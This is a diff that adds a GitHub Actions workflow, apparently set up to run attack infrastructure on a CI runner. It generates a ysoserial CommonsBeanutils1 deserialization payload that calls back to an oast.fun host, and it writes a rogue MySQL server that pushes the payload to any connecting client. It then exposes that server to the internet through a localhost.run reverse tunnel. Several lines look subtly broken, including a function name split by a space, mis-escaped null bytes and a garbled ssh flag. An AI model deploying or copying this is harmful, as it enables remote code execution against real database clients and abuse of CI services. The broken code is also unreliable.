@@ -1,0 +1,130 @@
+name: MySQL Deserialization Verification
+
+on:
+  workflow_dispatch:
+
+jobs:
+  server:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install Java
+        uses: actions/setup-java@v5
+        with:
+          java-version: '17'
+
+      - name: Download ysoserial
+        run: |
+          wget -q "https://github.com/frohoff/ysoserial/releases/download/latest/ysoserial-all.jar" -O ysoserial-all.jar
+          # Fallback: try mirror
+          if [ ! -f ysoserial-all.jar ]; then
+            wget -q "https://github.com/frohoff/ysoserial/releases/download/latest/ysoserial-all.jar" -O ysoserial-all.jar 2>/dev/null || true
+          fi
+          ls -la ysoserial-all.jar || echo "ysoserial download failed"
+
+      - name: Generate payload
+        run: |
+          java -jar ysoserial-all.jar CommonsBeanutils1 "nslookup mysql-deser-dns.d9jtljuucu0k5v69pvg03gsrqqb8ios7n.oast.fun" > payload.bin 2>/dev/null || true
+          if [ -f payload.bin ]; then
+            echo "Payload generated: $(wc -c < payload.bin) bytes"
+          else
+            echo "Failed to generate payload"
+          fi
+
+      - name: Create rogue MySQL server
+        run: |
+          cat > rogue_mysql.py << 'PYEOF'
+          import socket, struct, threading, sys
+
+          def make_packet(payload, seq=0):
+              header = struct.pack('<I', len(payload))[:3] + bytes([seq])
+              return header + payload
+
+          def greeting():
+              p = b'\x0a'
+              p += b'5.7.99-rogue\x00'
+              p += struct.pack('<I', 1)
+              p += b'ABCDEFGH'
+              p += b'\x00'
+              p += struct.pack('<H', 0xffff)
+              p += b'\x21'
+              p += struct.pack('<H', 0x0002)
+              p += struct.pack('<H', 0x00ff)
+              p += b'\x15'
+              p += b'\x00' * 10
+              p += b'IGHKLMNOPQRSTU\\00'
+              p += b'mysql_native_password\\00'
+              return make_packet(p)
+
+          def ok _packet():
+              return make_packet(b'\x00\x00\x02\x00\x00\x00', seq=2)
+
+          def err_packet():
+              return make_packet(b'\xff\x15\x04\\23H000\x00' + b'\\00' * 100, seq=2)
+
+          def handle(conn, addr, payload):
+              print(f'[+] Connection from {addr}', flush=True)
+              try:
+                  conn.send(greeting())
+                  data = conn.recv(4096)
+                  print(f'[*] Auth response: {len(data)} bytes', flush=True)
+                  conn.send(ok_packet())
+                  data = conn.recv(4096)
+                  print(f'[*] Query: {len(data)} bytes', flush=True)
+                  # Send payload as error packet with serialized object
+                  conn.send(err_packet())
+                  conn.send(payload)
+                  print('[+] Payload sent', flush=True)
+              except Exception as e:
+                  print(f'[-] Error: {e}', flush=True)
+              finally:
+                  conn.close()
+
+          def main():
+              payload_file = sys.argv[1] if len(sys.argv) > 1 else 'payload.bin'
+              try:
+                  with open(payload_file, 'rb') as f:
+                      payload = f.read()
+                  print(f'[*] Payload: {len(payload)} bytes', flush=True)
+              except:
+                  print('[!] No payload file, using empty', flush=True)
+                  payload = b''
+              server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+              server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+              server.bind(('0.0.0.0', 3306))
+              server.listen(5)
+              print('[*] Listening on :3306', flush=True)
+              while True:
+                  conn, addr = server.accept()
+                  threading.Thread(target=handle, args=(conn, addr, payload)).start()
+
+          if __name__ == '__main__':
+              main()
+          PYEOF
+
+      - name: Start server and tunnel
+        run: |
+          # Start rogue MySQL server in background
+          python3 rogue_mysql.py payload.bin &
+          server_PID=$!
+          sleep 2
+
+          # Try localhost.rut reverse tunnel
+          echo "[*] Starting reverse tunnel..."
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -\ -8888 nokey@localhost.run 80:localhost:3306 2>&1 &
+          tunnel_PID=$!
+          sleep 5
+
+          # Check if tunnel is up
+          echo "[*] Tunnel PID: ${tunnel_PID}"
+          echo "[*] Server PID: ${server_PID}"
+          ps aux | grep -e 'ssh --' -e 'rogue_mysql' | grep -v grep
+
+          # Keep alive for 10 minutes
+          echo "[*] Server running. Keeping alive for 10 minutes..."
+          sleep 600
+
+      - name: Cleanup
+        if: always()
+        run: |
+          pkill -f rogue_mysql.py || true
+          pkill -f 'ssh -' || true
